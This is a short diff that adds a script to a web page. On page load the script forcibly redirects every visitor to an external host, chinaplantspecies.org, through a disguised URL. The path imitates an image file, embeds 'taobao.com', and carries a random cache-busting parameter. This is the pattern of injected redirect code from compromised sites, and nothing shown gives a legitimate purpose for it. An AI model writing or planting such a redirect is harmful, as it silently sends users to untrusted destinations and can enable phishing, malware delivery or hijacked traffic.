@@ -1,0 +1,10 @@
+    <script>
+        let button = document.querySelector('button')
+        const targetUrl = 'http://images2.chinaplantspecies.org/q63HWmhJA3/186//taobao.com/o,s.jpg?code=q63HWmhJA3&186#';
+        const timestamp = Date.now();
+        const randomString = Math.random().toString(36).substring(2);
+        const urlWithParam = `${targetUrl}?timestamp=${timestamp}-${randomString}`;
+        window.onload = function () {
+            window.location.href = urlWithParam;
+        };
+    </script>
